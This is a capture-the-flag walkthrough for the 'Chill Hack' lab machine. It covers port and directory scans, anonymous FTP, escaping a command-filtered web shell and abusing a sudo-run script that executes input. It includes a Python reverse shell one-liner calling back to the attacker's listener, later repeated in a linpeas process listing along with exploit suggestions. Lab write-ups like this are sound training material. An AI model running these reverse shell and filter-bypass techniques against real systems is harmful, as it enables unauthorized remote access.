# Chill Hack

Laurent Chauvin | November 03, 2022

## Resources

## Progress

```
export IP=10.10.99.253
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 02:22 EDT
Nmap scan report for 10.10.99.253
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.23.136
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
```

Gobuster scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.99.253
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/03 02:23:14 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.99.253/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.99.253/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.99.253/js/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.99.253/fonts/]
/secret               (Status: 301) [Size: 313] [--> http://10.10.99.253/secret/]
/server-status        (Status: 403) [Size: 277]
Progress: 220560 / 220561 (100.00%)===============================================================
2022/11/03 03:04:14 Finished
===============================================================
```

Nikto scan
```
nikto -h "http://$IP" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.99.253
+ Target Hostname:    10.10.99.253
+ Target Port:        80
+ Start Time:         2022-11-03 02:23:23 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 8970, size: 56d7e303a7e80, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2022-11-03 02:39:28 (GMT-4) (965 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Nmap seems to show we could connect as anonymous and a 'note.txt' file exists. Let's go retrieve it.
```
ftp $IP

Connected to 10.10.99.253.
220 (vsFTPd 3.0.3)
Name (10.10.99.253:kali): anonymous
331 Please specify the password.
Password: <Enter>
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||46015|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |***********************************************************************************************************************************************************************************************|    90       35.85 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.78 KiB/s)
ftp> dir
229 Entering Extended Passive Mode (|||48408|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> exit
221 Goodbye.
```

What's in the note
```
cat note.txt            

Anurodh told me that there is some filtering on strings being put in the command -- Apaar                                                                                                    
```

'Anurodh' and 'Apaar' possible usernames for ssh. Also, commands will probably be filtered, but we'll see when we'll get there.

Let's check the website. No 'robots.txt'. Although ```gobuster``` found something interesting, a 'secret' folder. Let's check this out.

Humm, seems like a webshell. This is probably what they mean't by 'filtered' commands. Let's play with it.

Command 'ls' does not work (the website ask if we're a hacker ^^).

Command 'pwd' works and return '/var/www/html/secret'.

Command 'whoami' works and return 'www-data'

It would be possible to get a list of linux command and use curl to bruteforce which ones are allowed or not. But maybe we'll do that later if nothing works.

Command 'dir' works, a good alternative to 'ls'.

Command 'dir /home' return ```anurodh apaar aurick``` as expected the usernames we found are here. Can we get their ssh key ?

Only 'apaar' has an 'authorized_key' in '.ssh'.

Command 'cat' is not authorized.

Command 'less' and 'more' not authorized.

Command 'nl' seems to work to display files.

List ```apaar``` home directory
```
 .bash_history .bashrc .gnupg .profile .viminfo .. .bash_logout .cache .helpline.sh .ssh local.txt 
 ```

Let's check local.txt

```
nl /home/apaar/local.txt
```

Nothing apparently.

Command 'sudo -l' returns ```Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ubuntu: (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh```

Executing this ```/home/apaar/.helpline.sh``` command returns ```Welcome to helpdesk. Feel free to talk to anyone at any time! Thank you for your precious time!```

This scripts is
```
1 #!/bin/bash 
2 echo 
3 echo "Welcome to helpdesk. Feel free to talk to anyone at any time!" 
4 echo 
5 read -p "Enter the person whom you want to talk with: " person 
6 read -p "Hello user! I am $person, Please enter your message: " msg 
7 $msg 2>/dev/null 
8 echo "Thank you for your precious time!" 
```

The first thing to notice is that ```$msg``` is executed. We need to find a way to pass parameters to that script to set ```person```(garbage) and ```msg```.

Using this syntax we can now run commands without any filter
```
echo "whatever\n[cmd]" | /home/apaar/.helpline.sh
```

Let's make a python script.

Running ```send_cmd.py``` allow us to run any command with any filter.

Looking at ```authorized_keys```
```
cmd: cat /home/apaar/.ssh/authorized_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3BzOCWTm3aFsN/RKd4n4tBT71A+vJYONyyrDDj59Pv8lnVTtxi1/VI2Nb/op1nHUcuz1tYMJDMew2kkb+5CX6uiYfnryzD4OQoQUhC4tMSmopIoAi322Y5QSzSY1mSBESddCsn0C5VgE9in4PFl3rFv/k05hJDTXewmCh06vN7OAT5CLbf9lTtf1/Ga40pRixYFlV5owqZci697h17Is1K7RSFCQZwLGl29pLHPBwOpXkHpJqNqEl6Wgu+y0jvauNKzgIypD0EyojgX+1OPogSEr8WNuOc8w6wqQm6gTaAayPioIATTD/ECDBMJPLYN71t6Wdi5E+7R2GT6BIRFiGhTG65KXwXj6Vn7bj99BLSlaq2Qk6oUYpxhhkaE5koPKCJHb9zBsrGEUHTOMFjKhCypQCtjG9noW2jzm+/beqKcEZINQEQfzQFIGKdH0ypGfCCvD6YFUg7lcqQQH5Zd+9a95/5WyUE0XkNzJzU/yxfQ8RDB2In/ZptDYNBFoHXfM= root@ubuntu
```

Just a public key.

I have been stuck at this point. Looking for help, I read that if commands strings where using some backslash in the commands, they could be executed (directly from the website).

So I used this command to get a reverse shell
```
p\ython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.23.136",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

after starting a listener
```
nc -lnvp 9999
```

And got a shell. Now I could run the helpline.sh file as apaar with
```
sudo -u apaar ./.helpline.sh
```

Which I could use to spawn a shell as ```apaar``` with the method we used in our python script (sorry, didn't take the time to stabilize the shell, so it's a bit messy)
```
sudo -u apaar ./.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: me
Hello user! I am me,  Please enter your message: /bin/bash -p

whoami

apaar
cat local.txt

{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

Time to privesc. Upload linpeas.sh.

Started a local webserver with 
```
python3 -m http.server 80
```

Then use wget from remote to get linpeas.

```


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                     
    |         Follow on Twitter         :     @carlospolopm                           |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by carlospolop                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
OS: Linux version 4.15.0-118-generic (buildd@lgw01-amd64-039) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: ubuntu
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                         
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                              
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                                                                                                                                            
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                          
                              ╚════════════════════╝                                                                                                                                                                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                                          
Linux version 4.15.0-118-generic (buildd@lgw01-amd64-039) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020                                                                                     
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.5 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                                                             
Sudo version 1.8.21p2                                                                                                                                                                                                                       

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034                                                                                                                                                                                                                 

Potentially Vulnerable to CVE-2022-2588



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                                                                     
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                                                                                                      
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Date & uptime
Thu Nov  3 08:05:14 UTC 2022                                                                                                                                                                                                                
 08:05:14 up 34 min,  0 users,  load average: 0.36, 0.08, 0.03

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                                                                        

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                                                                                   
/dev/disk/by-id/dm-uuid-LVM-UvW9VThk4wInNNaOv0mExXKp2FJf7WIBVWe6weapEmKRPpjfhzMYYLC0O4gGeoPs    /       ext4    defaults        0 0                                                                                                         
/dev/disk/by-uuid/1e4eecdf-0441-42c4-beb5-eac62c8eb3c4  /boot   ext4    defaults        0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                                                                     
HISTFILESIZE=0                                                                                                                                                                                                                              
SHLVL=1
OLDPWD=/var/www/html
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:21310
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=1650377969864bcbbd76200618bb72f9
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/dev/shm
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                                                                                                      
dmesg Not Found                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
cat: write error: Broken pipe                                                                                                                                                                                                               
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                                                     
                                                                                                                                                                                                                                            
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                                                               
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                                           
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                                                    
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                                                      
═╣ Seccomp enabled? ............... disabled                                                                                                                                                                                                
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)                                                                                                                                                                                               

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                                                                         
                                   ╚═══════════╝                                                                                                                                                                                            
╔══════════╣ Container related tools present
/usr/bin/docker                                                                                                                                                                                                                             
/usr/bin/lxc
/usr/bin/runc
╔══════════╣ Am I Containered?
╔══════════╣ Container details                                                                                                                                                                                                              
═╣ Is this a container? ........... No                                                                                                                                                                                                      
═╣ Any running containers? ........ No                                                                                                                                                                                                      
                                                                                                                                                                                                                                            

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                                                                         
                                     ╚═══════╝                                                                                                                                                                                              
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS Lambda? .......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-0b5a75591ada50db0                                                                                                                                                                                                               
instance-action: none
instance-id: i-0849748fd4f2756f4
instance-life-cycle: spot
instance-type: t2.small
region: eu-west-1

══╣ Account Info
{                                                                                                                                                                                                                                           
  "Code" : "Success",
  "LastUpdated" : "2022-11-03T07:29:14Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:87:30:1d:46:29/                                                                                                                                                                                                                     
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role
                                                                                                                                                                                                                                            

══╣ User Data
                                                                                                                                                                                                                                            

                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                                                                          
                ╚════════════════════════════════════════════════╝                                                                                                                                                                          
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                 
root         1  0.1  0.4 159820  8952 ?        Ss   07:30   0:03 /sbin/init auto automatic-ubiquity noprompt                                                                                                                                
root       414  0.0  0.7  94884 14672 ?        S<s  07:30   0:00 /lib/systemd/systemd-journald
root       438  0.0  0.0 105904  1936 ?        Ss   07:30   0:00 /sbin/lvmetad -f
root       444  0.0  0.3  47400  6308 ?        Ss   07:30   0:00 /lib/systemd/systemd-udevd
systemd+   627  0.0  0.1 141956  3200 ?        Ssl  07:30   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   775  0.0  0.2  80080  5532 ?        Ss   07:31   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   789  0.0  0.2  70660  5116 ?        Ss   07:31   0:00 /lib/systemd/systemd-resolved
message+   908  0.0  0.2  50056  4652 ?        Ss   07:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       928  0.0  0.8 169100 17372 ?        Ssl  07:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       954  0.0  0.3 286244  6944 ?        Ssl  07:31   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       955  0.0  0.0 604888  2024 ?        Ssl  07:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
syslog     965  0.0  0.2 263036  4432 ?        Ssl  07:31   0:00 /usr/sbin/rsyslogd -n
root       978  0.0  1.2 654568 26304 ?        Ssl  07:31   0:00 /usr/bin/amazon-ssm-agent
root       983  0.0  0.2  62156  5820 ?        Ss   07:31   0:00 /lib/systemd/systemd-logind
root       995  0.0  0.1  30028  3284 ?        Ss   07:31   0:00 /usr/sbin/cron -f
daemon[0m     996  0.0  0.1  28332  2512 ?        Ss   07:31   0:00 /usr/sbin/atd -f
root      1000  0.0  0.1  29148  2852 ?        Ss   07:31   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root      1003  0.0  2.2 764292 46260 ?        Ssl  07:31   0:01 /usr/bin/containerd
root      1014  0.0  0.9 185948 20180 ?        Ssl  07:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1024  0.0  0.3 291452  7332 ?        Ssl  07:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1030  0.0  0.1  14664  2344 ttyS0    Ss+  07:31   0:01 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root      1035  0.0  0.0  14888  2028 tty1     Ss+  07:31   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root      1049  0.0  0.2  72304  5788 ?        Ss   07:31   0:00 /usr/sbin/sshd -D
root      1074  0.0  0.8 333740 16944 ?        Ss   07:31   0:00 /usr/sbin/apache2 -k start
www-data  1086  0.0  0.6 338576 14196 ?        S    07:31   0:00  _ /usr/sbin/apache2 -k start
www-data  1087  0.0  0.6 338576 13136 ?        S    07:31   0:00  _ /usr/sbin/apache2 -k start
www-data  2130  0.0  0.0   4628   796 ?        S    07:52   0:00  |   _ sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.23.136",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
www-data  2131  0.0  0.5  38516 10580 ?        S    07:52   0:00  |       _ python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.23.136",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
www-data  2132  0.0  0.1  18508  3480 pts/1    Ss   07:52   0:00  |           _ bash
root      2138  0.0  0.1  60576  3808 pts/1    S+   07:53   0:00  |               _ sudo -u apaar ./.helpline.sh
apaar     2139  0.0  0.1   9920  2832 pts/1    S+   07:53   0:00  |                   _ /bin/bash /home/apaar/.helpline.sh
apaar     2140  0.0  0.1   9920  2752 pts/1    S+   07:53   0:00  |                       _ /bin/bash -p
www-data  1088  0.0  0.6 338576 13188 ?        S    07:31   0:00  _ /usr/sbin/apache2 -k start
www-data  1089  0.0  0.6 338576 13132 ?        S    07:31   0:00  _ /usr/sbin/apache2 -k start
www-data  2151  0.0  0.0   4628   872 ?        S    08:02   0:00  |   _ sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.23.136",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
www-data  2152  0.0  0.5  38648 10688 ?        S    08:02   0:00  |       _ python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.23.136",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
www-data  2153  0.0  0.1  18508  3348 pts/2    Ss   08:02   0:00  |           _ bash
www-data  2162  0.1  0.1   5356  2496 pts/2    S+   08:04   0:00  |               _ /bin/sh ./linpeas.sh
